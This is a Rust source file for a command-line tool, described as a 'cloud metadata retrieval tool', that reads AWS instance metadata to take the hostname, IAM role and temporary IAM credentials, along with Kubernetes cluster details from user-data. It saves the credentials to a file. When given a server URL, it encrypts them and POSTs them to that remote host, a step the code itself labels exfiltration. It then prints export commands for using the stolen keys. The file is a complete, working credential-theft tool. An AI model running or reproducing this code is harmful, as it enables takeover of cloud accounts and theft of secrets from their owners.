use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use clap::{Parser, ValueEnum};
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::error::Error;

#[derive(Debug, Clone, ValueEnum)]
enum CloudProvider {
    AWS,
    GCP,
    Azure,
}

#[derive(Parser, Debug)]
#[command(author, version, about = "Cloud metadata retrieval tool", long_about = None)]
struct Args {
    /// Cloud provider
    #[arg(long, value_enum)]
    cloud: CloudProvider,

    /// Remote server URL for exfiltration (optional)
    #[arg(long)]
    server: Option<String>,

    /// Password for encryption (required if --server is specified)
    #[arg(long)]
    password: Option<String>,
}

#[derive(Debug, Deserialize, Serialize)]
#[serde(rename_all = "PascalCase")]
struct AwsCredentials {
    access_key_id: String,
    secret_access_key: String,
    token: String,
    expiration: String,
    code: String,
    last_updated: String,
    #[serde(rename = "Type")]
    cred_type: String,
}

#[derive(Debug, Serialize)]
struct ExfilData {
    hostname: String,
    iam_info: String,
    role_name: String,
    credentials: AwsCredentials,
    cluster_name: Option<String>,
    api_server: Option<String>,
}

#[derive(Debug, Serialize)]
struct EncryptedPayload {
    nonce: String,
    ciphertext: String,
}

const IMDS_TOKEN_URL: &str = "http://169.254.169.254/latest/api/token";
const IMDS_BASE_URL: &str = "http://169.254.169.254/latest/meta-data";

fn get_imds_token(client: &Client) -> Result<String, Box<dyn Error>> {
    let response = client
        .put(IMDS_TOKEN_URL)
        .header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
        .send()?;

    if !response.status().is_success() {
        return Err(format!("Failed to get IMDS token: {}", response.status()).into());
    }

    Ok(response.text()?)
}

fn get_metadata(client: &Client, token: &str, path: &str) -> Result<String, Box<dyn Error>> {
    let url = format!("{}/{}", IMDS_BASE_URL, path);
    let response = client
        .get(&url)
        .header("X-aws-ec2-metadata-token", token)
        .send()?;

    if !response.status().is_success() {
        return Err(format!(
            "Failed to get metadata from {}: {}",
            path,
            response.status()
        )
        .into());
    }

    Ok(response.text()?)
}

fn get_user_data(client: &Client, token: &str) -> Result<String, Box<dyn Error>> {
    let url = "http://169.254.169.254/latest/user-data";
    let response = client
        .get(url)
        .header("X-aws-ec2-metadata-token", token)
        .send()?;

    if !response.status().is_success() {
        return Err(format!("Failed to get user-data: {}", response.status()).into());
    }

    Ok(response.text()?)
}

fn parse_kubernetes_info(user_data: &str) -> Option<(String, String)> {
    let mut cluster_name = None;
    let mut api_server = None;

    for line in user_data.lines() {
        let line = line.trim();

        // Match patterns like: cluster-name = 'clustername' or "clustername"
        if line.starts_with("cluster-name") {
            if let Some(value_part) = line.split('=').nth(1) {
                let value = value_part
                    .trim()
                    .trim_matches('\'')
                    .trim_matches('"')
                    .to_string();
                if !value.is_empty() {
                    cluster_name = Some(value);
                }
            }
        }

        // Match patterns like: api-server = 'https://...' or "https://..."
        if line.starts_with("api-server") {
            if let Some(value_part) = line.split('=').nth(1) {
                let value = value_part
                    .trim()
                    .trim_matches('\'')
                    .trim_matches('"')
                    .to_string();
                if !value.is_empty() {
                    api_server = Some(value);
                }
            }
        }
    }

    match (cluster_name, api_server) {
        (Some(cn), Some(api)) => Some((cn, api)),
        _ => None,
    }
}

fn encrypt_data(data: &str, password: &str) -> Result<EncryptedPayload, Box<dyn Error>> {
    // Derive a 256-bit key from password using SHA-256
    let mut hasher = Sha256::new();
    hasher.update(password.as_bytes());
    let key_bytes = hasher.finalize();

    // Create cipher
    let cipher = Aes256Gcm::new_from_slice(&key_bytes)?;

    // Generate random nonce (96 bits for GCM)
    use rand::RngCore;
    let mut nonce_array = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_array);
    let nonce = Nonce::from_slice(&nonce_array);

    // Encrypt
    let ciphertext = cipher
        .encrypt(nonce, data.as_bytes())
        .map_err(|e| format!("Encryption failed: {}", e))?;

    Ok(EncryptedPayload {
        nonce: general_purpose::STANDARD.encode(&nonce_array),
        ciphertext: general_purpose::STANDARD.encode(ciphertext),
    })
}

fn send_encrypted_data(
    server_url: &str,
    encrypted: &EncryptedPayload,
) -> Result<(), Box<dyn Error>> {
    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()?;

    let url = format!("{}/datas", server_url.trim_end_matches('/'));

    let response = client.post(&url).json(encrypted).send()?;

    if !response.status().is_success() {
        return Err(format!("Server returned error: {}", response.status()).into());
    }

    Ok(())
}

fn process_aws(server_url: Option<&str>, password: Option<&str>) -> Result<(), Box<dyn Error>> {
    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()?;

    println!("Getting IMDS token...");
    let token = get_imds_token(&client)?;

    println!("\n=== Hostname ===");
    let hostname = get_metadata(&client, &token, "hostname")?;
    println!("{}", hostname);

    println!("\n=== IAM Info ===");
    let iam_info = get_metadata(&client, &token, "iam/info")?;
    println!("{}", iam_info);

    println!("\n=== IAM Security Credentials (Role Name) ===");
    let role_name = get_metadata(&client, &token, "iam/security-credentials")?;
    println!("{}", role_name);

    let role_name = role_name.trim();

    if role_name.is_empty() {
        return Err("No IAM role attached to this instance".into());
    }

    println!("\n=== Getting credentials for role: {} ===", role_name);
    let credentials_json = get_metadata(
        &client,
        &token,
        &format!("iam/security-credentials/{}", role_name),
    )?;

    // Parse JSON
    let credentials: AwsCredentials = serde_json::from_str(&credentials_json)?;

    // Write to file
    std::fs::write("aws_token", &credentials_json)?;
    println!("\nCredentials saved to aws_token");

    // Try to get Kubernetes cluster info from user-data
    println!("\n=== Kubernetes Cluster Info ===");
    let (cluster_name_opt, api_server_opt) = match get_user_data(&client, &token) {
        Ok(user_data) => {
            if let Some((cluster_name, api_server)) = parse_kubernetes_info(&user_data) {
                println!("Cluster Name: {}", cluster_name);
                println!("API Server: {}", api_server);

                // Check if API server is exposed on internet
                if api_server.contains("amazonaws.com") {
                    println!("\n⚠️  ALERT: API server endpoint contains 'amazonaws.com'");
                    println!("⚠️  This likely means the Kubernetes API server is exposed on the internet!");
                    println!("⚠️  This is a potential security risk.");
                }
                (Some(cluster_name.clone()), Some(api_server.clone()))
            } else {
                println!("No Kubernetes configuration found in user-data");
                (None, None)
            }
        }
        Err(e) => {
            println!("Could not retrieve user-data: {}", e);
            (None, None)
        }
    };

    // If server and password are provided, exfiltrate data
    if let (Some(server), Some(pass)) = (server_url, password) {
        println!("\n=== Exfiltrating data to remote server ===");

        let exfil_data = ExfilData {
            hostname: hostname.clone(),
            iam_info: iam_info.clone(),
            role_name: role_name.to_string(),
            credentials: AwsCredentials {
                access_key_id: credentials.access_key_id.clone(),
                secret_access_key: credentials.secret_access_key.clone(),
                token: credentials.token.clone(),
                expiration: credentials.expiration.clone(),
                code: credentials.code.clone(),
                last_updated: credentials.last_updated.clone(),
                cred_type: credentials.cred_type.clone(),
            },
            cluster_name: cluster_name_opt.clone(),
            api_server: api_server_opt.clone(),
        };

        let json_data = serde_json::to_string_pretty(&exfil_data)?;
        let encrypted = encrypt_data(&json_data, pass)?;

        match send_encrypted_data(server, &encrypted) {
            Ok(_) => println!("✓ Data successfully sent to {}/datas", server),
            Err(e) => println!("✗ Failed to send data: {}", e),
        }
    }

    // Display export commands
    println!("\n=== Export these environment variables ===");
    println!("export AWS_ACCESS_KEY_ID={}", credentials.access_key_id);
    println!(
        "export AWS_SECRET_ACCESS_KEY={}",
        credentials.secret_access_key
    );
    println!("export AWS_SESSION_TOKEN={}", credentials.token);

    if let Some(cluster_name) = cluster_name_opt {
        println!("\n=== Get EKS token ===");
        println!("aws eks get-token --cluster-name {}", cluster_name);
    }

    println!("\nNow run: aws sts get-caller-identity");

    Ok(())
}

fn main() {
    let args = Args::parse();

    // Validate that if server is provided, password must also be provided
    if args.server.is_some() && args.password.is_none() {
        eprintln!("Error: --password is required when --server is specified");
        std::process::exit(1);
    }

    let result = match args.cloud {
        CloudProvider::AWS => process_aws(args.server.as_deref(), args.password.as_deref()),
        CloudProvider::GCP => {
            eprintln!("GCP support not yet implemented");
            std::process::exit(1);
        }
        CloudProvider::Azure => {
            eprintln!("Azure support not yet implemented");
            std::process::exit(1);
        }
    };

    if let Err(e) = result {
        eprintln!("Error: {}", e);
        std::process::exit(1);
    }
}
